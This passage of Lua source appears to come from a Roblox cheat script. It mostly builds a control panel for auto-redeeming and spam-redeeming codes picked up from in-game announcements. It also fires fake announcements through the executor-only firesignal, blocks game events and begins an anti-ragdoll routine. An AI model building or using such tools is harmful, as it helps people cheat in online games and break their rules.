        tween(boxStroke, 0.12, { Color = THEME.acc, Transparency = 0 })
    end)
    codeBox.FocusLost:Connect(function()
        tween(boxStroke, 0.12, { Color = THEME.line, Transparency = 0.25 })
    end)
end

local copyBtn, clearBtn, redeemBtn
do
    local row = create("Frame", {
        Size = UDim2.new(1, 0, 0, 33),
        BackgroundTransparency = 1,
        LayoutOrder = 3,
    }, content)
    create("UIListLayout", {
        FillDirection = Enum.FillDirection.Horizontal,
        Padding = UDim.new(0, 6),
        SortOrder = Enum.SortOrder.LayoutOrder,
    }, row)

    copyBtn = createButton("COPY", row)
    copyBtn.Size = UDim2.new(1/3, -4, 1, 0); copyBtn.LayoutOrder = 1

    clearBtn = createButton("CLEAR", row)
    clearBtn.Size = UDim2.new(1/3, -4, 1, 0); clearBtn.LayoutOrder = 2

    redeemBtn = createAccentButton("REDEEM", row)
    redeemBtn.Size = UDim2.new(1/3, -4, 1, 0); redeemBtn.LayoutOrder = 3
end

local function createToggle(parent, order, text, initial, onChange)
    local row = create("Frame", {
        Size = UDim2.new(1, 0, 0, 31),
        BackgroundColor3 = THEME.panel,
        BackgroundTransparency = 0.1,
        BorderSizePixel = 0,
        LayoutOrder = order,
    }, parent)
    corner(row, 9)
    stroke(row, THEME.line, 1, 0.3)

    local lbl = label(text, 11, THEME.sub, FONT_BOLD, Enum.TextXAlignment.Left, row)
    lbl.Size = UDim2.new(1, -56, 1, 0)
    lbl.Position = UDim2.fromOffset(12, 0)
    lbl.TextTruncate = Enum.TextTruncate.AtEnd

    local track = create("Frame", {
        Size = UDim2.fromOffset(36, 18),
        Position = UDim2.new(1, -44, 0.5, -9),
        BackgroundColor3 = THEME.line,
        BorderSizePixel = 0,
    }, row)
    corner(track, 9)

    local knob = create("Frame", {
        Size = UDim2.fromOffset(14, 14),
        Position = UDim2.new(0, 2, 0.5, -7),
        BackgroundColor3 = THEME.txt,
        BorderSizePixel = 0,
    }, track)
    corner(knob, 7)

    local state = initial
    local function render()
        tween(track, 0.16, { BackgroundColor3 = state and THEME.acc or THEME.line })
        tween(knob, 0.16, { Position = UDim2.new(0, state and 20 or 2, 0.5, -7) }, Enum.EasingStyle.Back)
        tween(lbl,  0.16, { TextColor3 = state and THEME.txt or THEME.sub })
    end
    render()

    local hit = create("TextButton", { Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, Text = "" }, row)
    hit.MouseButton1Click:Connect(function()
        state = not state
        render()
        if onChange then onChange(state) end
    end)
    return row
end

local listenLabel, listenTrack, listenKnob, listenHit
do
    local row = create("Frame", {
        Size = UDim2.new(1, 0, 0, 31),
        BackgroundColor3 = THEME.panel,
        BackgroundTransparency = 0.1,
        BorderSizePixel = 0,
        LayoutOrder = 4,
    }, content)
    corner(row, 9)
    stroke(row, THEME.line, 1, 0.3)

    listenLabel = label("LISTEN", 11, THEME.sub, FONT_BOLD, Enum.TextXAlignment.Left, row)
    listenLabel.Size = UDim2.new(1, -56, 1, 0)
    listenLabel.Position = UDim2.fromOffset(12, 0)

    listenTrack = create("Frame", {
        Size = UDim2.fromOffset(36, 18),
        Position = UDim2.new(1, -44, 0.5, -9),
        BackgroundColor3 = THEME.line,
        BorderSizePixel = 0,
    }, row)
    corner(listenTrack, 9)

    listenKnob = create("Frame", {
        Size = UDim2.fromOffset(14, 14),
        Position = UDim2.new(0, 2, 0.5, -7),
        BackgroundColor3 = THEME.txt,
        BorderSizePixel = 0,
    }, listenTrack)
    corner(listenKnob, 7)

    listenHit = create("TextButton", {
        Size = UDim2.fromScale(1, 1),
        BackgroundTransparency = 1,
        Text = "",
    }, row)
end

local listenKeyBtn, listenKeyClear
local redeemKeyBtn, redeemKeyClear
local listenKeyRow, redeemKeyRow

do
    listenKeyRow = create("Frame", {
        Size = UDim2.new(1, 0, 0, 31),
        BackgroundColor3 = THEME.panel,
        BackgroundTransparency = 0.1,
        BorderSizePixel = 0,
        LayoutOrder = 5,
    }, content)
    corner(listenKeyRow, 9)
    stroke(listenKeyRow, THEME.line, 1, 0.3)

    local lbl = label("LISTEN KEY", 11, THEME.sub, FONT_BOLD, Enum.TextXAlignment.Left, listenKeyRow)
    lbl.Size = UDim2.new(1, -100, 1, 0)
    lbl.Position = UDim2.fromOffset(12, 0)

    listenKeyBtn = createButton(listenKey and listenKey.Name or "-", listenKeyRow)
    listenKeyBtn.Size = UDim2.fromOffset(46, 24)
    listenKeyBtn.Position = UDim2.new(1, -84, 0.5, -12)
    listenKeyBtn.TextSize = 11

    listenKeyClear = createButton("X", listenKeyRow)
    listenKeyClear.Size = UDim2.fromOffset(24, 24)
    listenKeyClear.Position = UDim2.new(1, -32, 0.5, -12)
    listenKeyClear.TextSize = 12
end

do
    redeemKeyRow = create("Frame", {
        Size = UDim2.new(1, 0, 0, 31),
        BackgroundColor3 = THEME.panel,
        BackgroundTransparency = 0.1,
        BorderSizePixel = 0,
        LayoutOrder = 6,
    }, content)
    corner(redeemKeyRow, 9)
    stroke(redeemKeyRow, THEME.line, 1, 0.3)

    local lbl = label("REDEEM KEY", 11, THEME.sub, FONT_BOLD, Enum.TextXAlignment.Left, redeemKeyRow)
    lbl.Size = UDim2.new(1, -100, 1, 0)
    lbl.Position = UDim2.fromOffset(12, 0)

    redeemKeyBtn = createButton(redeemKey and redeemKey.Name or "-", redeemKeyRow)
    redeemKeyBtn.Size = UDim2.fromOffset(46, 24)
    redeemKeyBtn.Position = UDim2.new(1, -84, 0.5, -12)
    redeemKeyBtn.TextSize = 11

    redeemKeyClear = createButton("X", redeemKeyRow)
    redeemKeyClear.Size = UDim2.fromOffset(24, 24)
    redeemKeyClear.Position = UDim2.new(1, -32, 0.5, -12)
    redeemKeyClear.TextSize = 12
end

createToggle(content, 7, "AUTO REDEEM", autoRedeem, function(v)
    autoRedeem = v
    _G.__RdmCfgSet("autoRedeem", v)
end)

createToggle(content, 8, "AUTO TYPE", autoType, function(v)
    autoType = v
    _G.__RdmCfgSet("autoType", v)
end)

createToggle(content, 9, "MANUAL", manual, function(v)
    manual = v
    listenedWords = {}
end)

local wordsRow
local function createSegmented(parent, order, name, options, initial, onChange)
    local row = create("Frame", {
        Size = UDim2.new(1, 0, 0, 31),
        BackgroundColor3 = THEME.panel,
        BackgroundTransparency = 0.1,
        BorderSizePixel = 0,
        LayoutOrder = order,
    }, parent)
    corner(row, 9)
    stroke(row, THEME.line, 1, 0.3)

    local lbl = label(name, 11, THEME.sub, FONT_BOLD, Enum.TextXAlignment.Left, row)
    lbl.Size = UDim2.fromOffset(56, 31)
    lbl.Position = UDim2.fromOffset(11, 0)

    local track = create("Frame", {
        Size = UDim2.fromOffset(168, 23),
        Position = UDim2.new(1, -177, 0.5, -11.5),
        BackgroundColor3 = THEME.input,
        BorderSizePixel = 0,
    }, row)
    corner(track, 7)

    local btns = {}
    local function render(selected)
        for key, btn in pairs(btns) do
            local active = key == selected
            tween(btn, 0.12, { BackgroundColor3 = active and THEME.acc or THEME.input })
            btn.TextColor3 = active and Color3.fromRGB(30, 12, 4) or THEME.sub
        end
        if onChange then onChange(selected) end
    end

    for i, opt in ipairs(options) do
        local key = type(opt) == "table" and opt[1] or opt
        local text = type(opt) == "table" and opt[2] or opt
        local btn = create("TextButton", {
            Size = UDim2.new(1/#options, -2, 1, -2),
            Position = UDim2.new((i-1)/#options, 1, 0, 1),
            BackgroundColor3 = THEME.input,
            Text = text,
            Font = FONT_BOLD,
            TextSize = text:find("\n") and 8 or 10,
            TextColor3 = THEME.sub,
            AutoButtonColor = false,
            BorderSizePixel = 0,
        }, track)
        corner(btn, 6)
        btns[key] = btn
        btn.MouseButton1Click:Connect(function() render(key) end)
    end

    render(initial)
    return row, render
end

local _, refreshWords = createSegmented(content, 11, "WORDS",
    { "1", "2", "3", "4" }, tostring(wordsToCollect),
    function(v)
        wordsToCollect = tonumber(v) or 1
        listenedWords = {}
        if isListening and not manual then
            setStatus(("listening... 0/%d"):format(wordsToCollect), "wait")
        end
    end)
wordsRow = content:GetChildren()[#content:GetChildren()]

local spamStroke, spamLabel, spamStartBtn, spamDot
do
    local row = create("Frame", {
        Size = UDim2.new(1, 0, 0, 31),
        BackgroundColor3 = THEME.panel,
        BackgroundTransparency = 0.1,
        BorderSizePixel = 0,
        LayoutOrder = 12,
    }, content)
    corner(row, 9)
    spamStroke = stroke(row, THEME.line, 1, 0.3)

    spamLabel = label("SPAM REDEEM", 11, THEME.sub, FONT_BOLD, Enum.TextXAlignment.Left, row)
    spamLabel.Size = UDim2.new(1, -94, 1, 0)
    spamLabel.Position = UDim2.fromOffset(11, 0)

    spamStartBtn = createButton("START", row)
    spamStartBtn.Size = UDim2.fromOffset(70, 24)
    spamStartBtn.Position = UDim2.new(1, -78, 0.5, -12)
    spamStartBtn.TextSize = 11

    spamDot = create("Frame", {
        Size = UDim2.fromOffset(7, 7),
        Position = UDim2.new(0, 9, 0.5, -3.5),
        BackgroundColor3 = THEME.line,
        BorderSizePixel = 0,
    }, spamStartBtn)
    corner(spamDot, 4)

    createSegmented(content, 13, "SPEED",
        { "MAX", { "WORD", "EVERY\nWORD" } },
        _G.__RdmCfgBool("wordMode", false) and "WORD" or "MAX",
        function(v)
            wordMode = v == "WORD"
            if not wordMode then
                maxSpamDelay = SPEED_PRESETS[v] or SPEED_PRESETS.MAX
            end
            _G.__RdmCfgSet("speed", v)
            _G.__RdmCfgSet("wordMode", wordMode)
        end)
end

for _, d in ipairs(content:GetDescendants()) do
    if d:IsA("TextButton") and d.Text == "EVERY\nWORD" then
        create("TextLabel", {
            Size = UDim2.fromOffset(64, 8),
            AnchorPoint = Vector2.new(0.5, 1),
            Position = UDim2.new(0.5, 0, 0, -1),
            BackgroundTransparency = 1,
            TextColor3 = THEME.warn,
            TextTransparency = 0.35,
            Font = FONT_BLACK,
            TextSize = 8,
            Text = "RECOMMENDED",
            ZIndex = 3,
        }, d)
        break
    end
end

do
    local row = create("Frame", {
        Size = UDim2.new(1, 0, 0, 31),
        BackgroundColor3 = THEME.panel,
        BackgroundTransparency = 0.1,
        BorderSizePixel = 0,
        LayoutOrder = 14,
    }, content)
    corner(row, 9)
    stroke(row, THEME.line, 1, 0.3)

    local lbl = label("EVENTS", 11, THEME.sub, FONT_BOLD, Enum.TextXAlignment.Left, row)
    lbl.Size = UDim2.new(1, -104, 1, 0)
    lbl.Position = UDim2.fromOffset(11, 0)

    local blockAll = createButton("BLOCK ALL", row)
    blockAll.Size = UDim2.fromOffset(88, 24)
    blockAll.Position = UDim2.new(1, -97, 0.5, -12)
    blockAll.TextSize = 10

    local busy = false
    local lastKey = nil
    local pendingMsg, pendingKind
    local blockedUntil = 0

    local function render()
        local blocked = os.clock() < blockedUntil
        local key = tostring(eventBlock.ready) .. tostring(blocked)
        if key == lastKey then return end
        lastKey = key
        blockAll.Text = blocked and "BLOCKED" or "BLOCK ALL"
        blockAll.TextColor3 = not eventBlock.ready and THEME.sub
            or blocked and THEME.ok or THEME.txt
    end

    blockAll.MouseButton1Click:Connect(function()
        if busy then return end
        if not eventBlock.ready then
            setStatus("events: " .. tostring(eventBlock.why), "err")
            return
        end
        busy = true
        setStatus("blocking events...", "busy")
        task.spawn(function()
            local ok, a, b = pcall(eventBlock.Block)
            if ok and a then
                pendingMsg, pendingKind = (b or "blocked"), "ok"
            else
                pendingMsg, pendingKind = "events: " .. tostring(b or a), "err"
            end
            busy = false
        end)
    end)

    task.spawn(function()
        while row.Parent do
            if pendingMsg then
                local msg, kind = pendingMsg, pendingKind
                pendingMsg, pendingKind = nil, nil
                if kind == "ok" then blockedUntil = os.clock() + 1 end
                pcall(setStatus, msg, kind)
            end
            pcall(render)
            task.wait(0.2)
        end
    end)
    render()
end

local SettingsWindow, SettingsBar, SettingsIcon, SettingsTitle
local settingsContent
local settingsVisible = false

do
    SettingsWindow, SettingsBar, SettingsIcon, SettingsTitle =
        createWindow("Settings", 300, touchOnly and 316 or 280, "SETTINGS")
    SettingsWindow.Visible = false
    SettingsWindow.Parent = ScreenGui

    local close = createButton("X", SettingsBar)
    close.Size = UDim2.fromOffset(22, 22)
    close.Position = UDim2.new(1, -28, 0.5, -11)
    close.TextSize = 12
    close.MouseButton1Click:Connect(function() SettingsWindow.Visible = false end)

    settingsContent = create("Frame", {
        Size = UDim2.new(1, -20, 1, -60),
        Position = UDim2.fromOffset(10, 50),
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
    }, SettingsWindow)
    create("UIListLayout", {
        Padding = UDim.new(0, 5),
        SortOrder = Enum.SortOrder.LayoutOrder,
    }, settingsContent)

    createToggle(settingsContent, 1, "AUTO LISTEN", autoListen, function(v)
        autoListen = v
        _G.__RdmCfgSet("autoListen", v)
    end)
    createToggle(settingsContent, 2, "SPAM ON LISTEN", spamOnListen, function(v)
        spamOnListen = v
        _G.__RdmCfgSet("spamOnListen", v)
    end)
    createToggle(settingsContent, 3, "SHOW KEYBINDS", showKeybinds, function(v)
        showKeybinds = v
        _G.__RdmCfgSet("showKeybinds", v)
    end)
    createToggle(settingsContent, 4, "IGNORE SYSTEM PHRASES", ignoreSystemPhrases, function(v)
        ignoreSystemPhrases = v
        _G.__RdmCfgSet("ignoreSystem", v)
    end)

    do
        local row = createToggle(settingsContent, 6, "DUO MODE (WITH RIDDLER)",
            _G.__RdmDuo,
            function(v)
                _G.__RdmDuo = v
                _G.__RdmCfgSet("duo", v)
                if _G.__SabDuoSync then _G.__SabDuoSync() end
            end)

        local counter = label("0/2", 10, THEME.sub, FONT_BOLD, Enum.TextXAlignment.Right, row)
        counter.Size = UDim2.fromOffset(50, 31)
        counter.Position = UDim2.new(1, -84, 0, 0)

        for _, child in ipairs(row:GetChildren()) do
            if child:IsA("TextLabel") and child ~= counter then
                child.Size = UDim2.new(1, -100, 1, 0)
            end
        end

        local function refreshDuo()
            local n = (_G.__RiddlerDuo and 1 or 0) + (_G.__RdmDuo and 1 or 0)
            counter.Text = n .. "/2"
            counter.TextColor3 = n == 2 and THEME.acc
                or n == 1 and (THEME.warn or THEME.sub)
                or THEME.sub
        end
        refreshDuo()

        _G.__SabDuoRefresh = _G.__SabDuoRefresh or {}
        _G.__SabDuoRefresh.redeemer = refreshDuo
        _G.__SabDuoSync = function()
            for _, fn in pairs(_G.__SabDuoRefresh or {}) do
                pcall(fn)
            end
        end
        _G.__SabDuoSync()

        task.spawn(function()
            while row.Parent do
                refreshDuo()
                task.wait(1)
            end
        end)
    end

    if touchOnly then
        local uiSizeRow = create("Frame", {
            Size = UDim2.new(1, 0, 0, 31),
            BackgroundColor3 = THEME.panel,
            BackgroundTransparency = 0.1,
            BorderSizePixel = 0,
            LayoutOrder = 5,
        }, settingsContent)
        corner(uiSizeRow, 9)
        stroke(uiSizeRow, THEME.line, 1, 0.3)

        local lbl = label("UI SIZE", 11, THEME.sub, FONT_BOLD, Enum.TextXAlignment.Left, uiSizeRow)
        lbl.Size = UDim2.fromOffset(70, 31)
        lbl.Position = UDim2.fromOffset(11, 0)

        local track = create("Frame", {
            Size = UDim2.fromOffset(168, 23),
            Position = UDim2.new(1, -177, 0.5, -11.5),
            BackgroundColor3 = THEME.input,
            BorderSizePixel = 0,
        }, uiSizeRow)
        corner(track, 7)

        local btns = {}
        local function apply(name, silent)
            for key, btn in pairs(btns) do
                local active = key == name
                tween(btn, 0.12, { BackgroundColor3 = active and THEME.acc or THEME.input })
                btn.TextColor3 = active and Color3.fromRGB(30, 12, 4) or THEME.sub
            end
            if silent then return end
            _G.__RdmCfgSet("uiSize", name)
            if CONFIG.refit then CONFIG.refit() end
        end

        for i, name in ipairs({ "BIG", "MEDIUM", "SMALL" }) do
            local btn = create("TextButton", {
                Size = UDim2.new(1/3, -2, 1, -2),
                Position = UDim2.new((i-1)/3, 1, 0, 1),
                BackgroundColor3 = THEME.input,
                Text = name,
                Font = FONT_BOLD,
                TextSize = 9,
                TextColor3 = THEME.sub,
                AutoButtonColor = false,
                BorderSizePixel = 0,
            }, track)
            corner(btn, 6)
            btns[name] = btn
            btn.MouseButton1Click:Connect(function() apply(name) end)
        end
        apply(_G.__RdmCfgStr("uiSize", "MEDIUM"), true)
    end

    local autoBuyRow = create("Frame", {
        Size = UDim2.new(1, 0, 0, 31),
        BackgroundColor3 = THEME.panel,
        BackgroundTransparency = 0.1,
        BorderSizePixel = 0,
        LayoutOrder = 6,
    }, settingsContent)
    corner(autoBuyRow, 9)
    stroke(autoBuyRow, THEME.line, 1, 0.3)

    local lbl = label("AUTO BUY", 11, THEME.sub, FONT_BOLD, Enum.TextXAlignment.Left, autoBuyRow)
    lbl.Size = UDim2.new(1, -70, 1, 0)
    lbl.Position = UDim2.fromOffset(12, 0)

    local open = createButton("OPEN", autoBuyRow)
    open.Size = UDim2.fromOffset(52, 22)
    open.Position = UDim2.new(1, -60, 0.5, -11)
    open.TextSize = 10
    open.MouseButton1Click:Connect(function()
        SettingsWindow.Visible = false
        if openAutoBuy then openAutoBuy() end
    end)
end

local updateWordsVisibility, updateKeybindVisibility

do
    local BASE_HEIGHT  = 548
    local ROW_HEIGHT   = 36
    local state        = {}
    local animTokens   = {}
    local hiddenCount  = 0

    local function collapse(row, visible, instant)
        local cur = state[row]
        if cur == nil then cur = true end
        if cur == visible then return end
        state[row] = visible
        animTokens[row] = (animTokens[row] or 0) + 1
        local token = animTokens[row]

        hiddenCount = math.max(0, hiddenCount + (visible and -1 or 1))
        expandedHeight = BASE_HEIGHT - hiddenCount * ROW_HEIGHT

        if not collapsed then
            if instant then
                Main.Size = UDim2.fromOffset(316, expandedHeight)
            else
                tween(Main, 0.2, { Size = UDim2.fromOffset(316, expandedHeight) }, Enum.EasingStyle.Quart)
            end
        end

        row.ClipsDescendants = true
        if visible then
            row.Visible = true
            if instant then
                row.Size = UDim2.new(1, 0, 0, 31)
                row.ClipsDescendants = false
                return
            end
            row.Size = UDim2.new(1, 0, 0, 0)
            tween(row, 0.2, { Size = UDim2.new(1, 0, 0, 31) }, Enum.EasingStyle.Quart)
            task.delay(0.22, function()
                if animTokens[row] == token then
                    row.ClipsDescendants = false
                end
            end)
        else
            if instant then
                row.Size = UDim2.new(1, 0, 0, 0)
                row.Visible = false
                return
            end
            tween(row, 0.2, { Size = UDim2.new(1, 0, 0, 0) }, Enum.EasingStyle.Quart)
            task.delay(0.22, function()
                if animTokens[row] == token then
                    row.Visible = false
                end
            end)
        end
    end

    updateWordsVisibility = function(instant)
        collapse(wordsRow, not manual, instant)
    end
    updateKeybindVisibility = function(instant)
        collapse(listenKeyRow, showKeybinds, instant)
        collapse(redeemKeyRow, showKeybinds, instant)
    end
end

local openSettings, openFeed, openTest, openAutoBuy, stopAutoBuy

do
    openSettings = function()
        if touchOnly then
            SettingsWindow.Position = UDim2.new(0.5,
                -math.floor(SettingsWindow.AbsoluteSize.X / 2), 0.5,
                -math.floor(SettingsWindow.AbsoluteSize.Y / 2))
        else
            local p = Main.Position
            SettingsWindow.Position = UDim2.new(p.X.Scale, p.X.Offset - SettingsWindow.AbsoluteSize.X - 10, p.Y.Scale, p.Y.Offset)
        end
        SettingsWindow.Visible = true
    end

    SetBtn.MouseButton1Click:Connect(function()
        if not SettingsWindow.Visible then
            openSettings()
        else
            SettingsWindow.Visible = false
        end
    end)

    updateKeybindVisibility(true)
    updateWordsVisibility(true)
end

local feedWindow, feedCount, feedList, feedEmpty, feedAdd
local feedEntries = {}
local feedTotal = 0

do
    local feedTitleRow
    feedWindow, feedTitleRow = createWindow("Feed", 300, 320, "LIVE FEED")
    feedWindow.Visible = false
    feedWindow.Parent = ScreenGui

    local dot = create("Frame", {
        Size = UDim2.fromOffset(8, 8),
        Position = UDim2.new(1, -176, 0.5, -4),
        BackgroundColor3 = THEME.ok,
        BorderSizePixel = 0,
    }, feedTitleRow)
    corner(dot, 4)

    feedCount = label("0 caught", 10, THEME.sub, FONT_BOLD, Enum.TextXAlignment.Right, feedTitleRow)
    feedCount.Size = UDim2.fromOffset(80, 44)
    feedCount.Position = UDim2.new(1, -166, 0, 0)

    local clearBtn = createButton("Clear", feedTitleRow)
    clearBtn.Size = UDim2.fromOffset(40, 22)
    clearBtn.Position = UDim2.new(1, -82, 0.5, -11)
    clearBtn.TextSize = 10

    local closeBtn = createButton("X", feedTitleRow)
    closeBtn.Size = UDim2.fromOffset(22, 22)
    closeBtn.Position = UDim2.new(1, -32, 0.5, -11)
    closeBtn.TextSize = 12
    closeBtn.MouseButton1Click:Connect(function() feedWindow.Visible = false end)

    feedList = create("ScrollingFrame", {
        Size = UDim2.new(1, -18, 1, -56),
        Position = UDim2.fromOffset(11, 50),
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        ScrollBarThickness = 3,
        ScrollBarImageColor3 = THEME.acc,
        ScrollBarImageTransparency = 0.3,
        CanvasSize = UDim2.new(),
        AutomaticCanvasSize = Enum.AutomaticSize.Y,
        ScrollingDirection = Enum.ScrollingDirection.Y,
    }, feedWindow)
    create("UIListLayout", {
        Padding = UDim.new(0, 6),
        SortOrder = Enum.SortOrder.LayoutOrder,
    }, feedList)

    feedEmpty = label("the graveyard is quiet...", 11, THEME.sub, FONT_MED,
        Enum.TextXAlignment.Center, feedList)
    feedEmpty.Size = UDim2.new(1, 0, 0, 34)
    feedEmpty.LayoutOrder = 999

    local function repositionFeed()
        if touchOnly then
            feedWindow.Position = UDim2.new(0.5,
                -math.floor(feedWindow.AbsoluteSize.X / 2), 0.5,
                -math.floor(feedWindow.AbsoluteSize.Y / 2))
        else
            local p = Main.Position
            feedWindow.Position = UDim2.new(p.X.Scale, p.X.Offset - feedWindow.AbsoluteSize.X - 10, p.Y.Scale, p.Y.Offset)
        end
        feedWindow.Visible = true
    end
    openFeed = repositionFeed

    feedAdd = function(text, code)
        if feedEmpty then feedEmpty:Destroy(); feedEmpty = nil end
        feedTotal = feedTotal + 1
        feedCount.Text = feedTotal .. " caught"

        local card = create("Frame", {
            Size = UDim2.new(1, -4, 0, 0),
            AutomaticSize = Enum.AutomaticSize.Y,
            BackgroundColor3 = THEME.panel,
            BackgroundTransparency = 0.1,
            BorderSizePixel = 0,
            LayoutOrder = -feedTotal,
        }, feedList)
        corner(card, 9)
        stroke(card, code and THEME.acc or THEME.line, 1, code and 0.3 or 0.5)
        create("UIPadding", {
            PaddingTop = UDim.new(0, 8), PaddingBottom = UDim.new(0, 8),
            PaddingLeft = UDim.new(0, 10), PaddingRight = UDim.new(0, 10),
        }, card)
        create("UIListLayout", { Padding = UDim.new(0, 5), SortOrder = Enum.SortOrder.LayoutOrder }, card)

        local header = create("Frame", { Size = UDim2.new(1, 0, 0, 12), BackgroundTransparency = 1, LayoutOrder = 1 }, card)
        corner(create("Frame", {
            Size = UDim2.fromOffset(6, 6),
            Position = UDim2.new(0, 0, 0.5, -3),
            BackgroundColor3 = code and THEME.acc or THEME.sub,
            BorderSizePixel = 0,
        }, header), 3)
        label("NOTIFY", 8, THEME.acc, FONT_BLACK, Enum.TextXAlignment.Left, header).Position = UDim2.fromOffset(12, 0)

        local stamp = label(os.date("%H:%M:%S"), 8, THEME.sub, FONT_MED, Enum.TextXAlignment.Right, header)
        stamp.Size = UDim2.new(0, 60, 1, 0)
        stamp.Position = UDim2.new(1, -60, 0, 0)

        local body = label(text, 10, THEME.txt, FONT_MED, Enum.TextXAlignment.Left, card)
        body.Size = UDim2.new(1, 0, 0, 0)
        body.AutomaticSize = Enum.AutomaticSize.Y
        body.TextWrapped = true
        body.LayoutOrder = 2

        if code then
            local row = create("Frame", {
                Size = UDim2.new(1, 0, 0, 24),
                BackgroundTransparency = 1,
                LayoutOrder = 3,
            }, card)

            local codeLbl = create("TextLabel", {
                Size = UDim2.new(0.5, -3, 1, 0),
                BackgroundColor3 = THEME.input,
                Text = code,
                Font = FONT_BLACK,
                TextSize = 12,
                TextColor3 = THEME.acc,
                BorderSizePixel = 0,
            }, row)
            corner(codeLbl, 6)
            stroke(codeLbl, THEME.acc, 1, 0.4)

            local copy = createButton("COPY", row)
            copy.Size = UDim2.new(0.22, -3, 1, 0)
            copy.Position = UDim2.new(0.52, 3, 0, 0)
            copy.TextSize = 9
            copy.MouseButton1Click:Connect(function()
                copy.Text = copyToClipboard(code) and "OK" or "ERR"
                task.delay(0.7, function()
                    if copy.Parent then copy.Text = "COPY" end
                end)
            end)

            local use = createAccentButton("USE", row)
            use.Size = UDim2.new(0.26, -3, 1, 0)
            use.Position = UDim2.new(0.74, 3, 0, 0)
            use.TextSize = 10
            use.MouseButton1Click:Connect(function()
                use.Text = "..."
                if _G.__TracedUse then _G.__TracedUse(code) end
                use.Text = "USE"
            end)
        end

        table.insert(feedEntries, card)
        if #feedEntries > CONFIG.maxFeed then
            local old = table.remove(feedEntries, 1)
            if old then old:Destroy() end
        end
    end

    clearBtn.MouseButton1Click:Connect(function()
        for _, e in ipairs(feedEntries) do e:Destroy() end
        feedEntries = {}
        feedTotal = 0
        feedCount.Text = "0 caught"
        if not feedEmpty then
            feedEmpty = label("the graveyard is quiet...", 11, THEME.sub, FONT_MED,
                Enum.TextXAlignment.Center, feedList)
            feedEmpty.Size = UDim2.new(1, 0, 0, 34)
            feedEmpty.LayoutOrder = 999
        end
    end)

    FeedBtn.MouseButton1Click:Connect(function()
        if feedWindow.Visible then
            feedWindow.Visible = false
        else
            repositionFeed()
        end
    end)
end

local testWindow, testTextBox
do
    local testTitleRow
    testWindow, testTitleRow = createWindow("Test", 300, 178, "TEST SENDER")
    testWindow.Visible = false
    testWindow.Parent = ScreenGui

    local close = createButton("X", testTitleRow)
    close.Size = UDim2.fromOffset(22, 22)
    close.Position = UDim2.new(1, -28, 0.5, -11)
    close.TextSize = 12
    close.MouseButton1Click:Connect(function() testWindow.Visible = false end)

    local body = create("Frame", {
        Size = UDim2.new(1, -24, 1, -58),
        Position = UDim2.fromOffset(12, 50),
        BackgroundTransparency = 1,
    }, testWindow)
    create("UIListLayout", { Padding = UDim.new(0, 8), SortOrder = Enum.SortOrder.LayoutOrder }, body)

    local box = create("Frame", {
        Size = UDim2.new(1, 0, 0, 54),
        BackgroundColor3 = THEME.panel,
        BackgroundTransparency = 0.1,
        BorderSizePixel = 0,
        LayoutOrder = 1,
    }, body)
    corner(box, 9)
    stroke(box, THEME.line, 1, 0.3)

    local heading = label("MESSAGE", 9, THEME.acc, FONT_BLACK, Enum.TextXAlignment.Left, box)
    heading.Size = UDim2.new(1, -16, 0, 12)
    heading.Position = UDim2.fromOffset(11, 6)

    testTextBox = create("TextBox", {
        Size = UDim2.new(1, -18, 0, 26),
        Position = UDim2.fromOffset(9, 20),
        BackgroundColor3 = THEME.input,
        Text = "",
        PlaceholderText = "type a fake announcement...",
        PlaceholderColor3 = THEME.sub,
        Font = FONT_BLACK,
        TextSize = 13,
        TextColor3 = THEME.txt,
        ClearTextOnFocus = false,
        BorderSizePixel = 0,
        TextXAlignment = Enum.TextXAlignment.Left,
    }, box)
    corner(testTextBox, 7)

    local tbStroke = stroke(testTextBox, THEME.line, 1.2, 0.25)
    create("UIPadding", { PaddingLeft = UDim.new(0, 9), PaddingRight = UDim.new(0, 9) }, testTextBox)
    testTextBox.Focused:Connect(function() tween(tbStroke, 0.12, { Color = THEME.acc, Transparency = 0 }) end)
    testTextBox.FocusLost:Connect(function() tween(tbStroke, 0.12, { Color = THEME.line, Transparency = 0.25 }) end)

    local row = create("Frame", {
        Size = UDim2.new(1, 0, 0, 34),
        BackgroundTransparency = 1,
        LayoutOrder = 2,
    }, body)
    local testCode = createButton("TEST CODE", row)
    testCode.Size = UDim2.new(0.4, -4, 1, 0)

    local sendBtn = createAccentButton("SEND", row)
    sendBtn.Size = UDim2.new(0.6, -4, 1, 0)
    sendBtn.Position = UDim2.new(0.4, 4, 0, 0)

    local info = label("", 10, THEME.sub, FONT_MED, Enum.TextXAlignment.Left, body)
    info.Size = UDim2.new(1, -4, 0, 14)
    info.LayoutOrder = 3

    local function send(text)
        local clean = trim(text)
        if clean == "" then
            info.Text = "nothing to send"
            info.TextColor3 = THEME.err
            return
        end
        if not (notifyRemote and not remoteFallbackUsed and typeof(firesignal) == "function") then
            local ok = pcall(onAnnouncement, clean, nil, nil, "Top", 2678001507)
            info.Text = ok and ("local test: " .. clean) or "handler error"
            info.TextColor3 = ok and THEME.ok or THEME.err
            return
        end
        local ok = pcall(firesignal, notifyRemote.OnClientEvent, clean, nil, nil, "Top", 2678001507)
        info.Text = ok and ("fired: " .. clean) or "firesignal failed"
        info.TextColor3 = ok and THEME.ok or THEME.err
    end

    sendBtn.MouseButton1Click:Connect(function()
        send(testTextBox.Text)
        testTextBox.Text = ""
        testTextBox:CaptureFocus()
    end)
    testTextBox.FocusLost:Connect(function(enter)
        if enter then
            send(testTextBox.Text)
            testTextBox.Text = ""
            testTextBox:CaptureFocus()
        end
    end)
    testCode.MouseButton1Click:Connect(function()
        send("TESTCODE" .. tostring(math.random(1000, 9999)))
    end)

    TestBtn.MouseButton1Click:Connect(function()
        if testWindow.Visible then
            testWindow.Visible = false
            return
        end
        if touchOnly then
            testWindow.Position = UDim2.new(0.5,
                -math.floor(testWindow.AbsoluteSize.X / 2), 0.5,
                -math.floor(testWindow.AbsoluteSize.Y / 2))
        else
            local p = Main.Position
            testWindow.Position = UDim2.new(p.X.Scale, p.X.Offset - testWindow.AbsoluteSize.X - 10, p.Y.Scale,
                p.Y.Offset + Main.AbsoluteSize.Y - testWindow.AbsoluteSize.Y)
        end
        testWindow.Visible = true
    end)
end

local antiRagdoll = {
    Enabled = false,
    Connections = {},
    Welds = {},
    LastPosition = nil,
    JumpPauseUntil = 0,
    JumpPauseDuration = 0.6,
    KnockbackThreshold = 35,
    MaxUpwardVelocity = 60,
    MaxHorizontalVelocity = 12,
    MaxFrameDisplacement = 10,
}

do
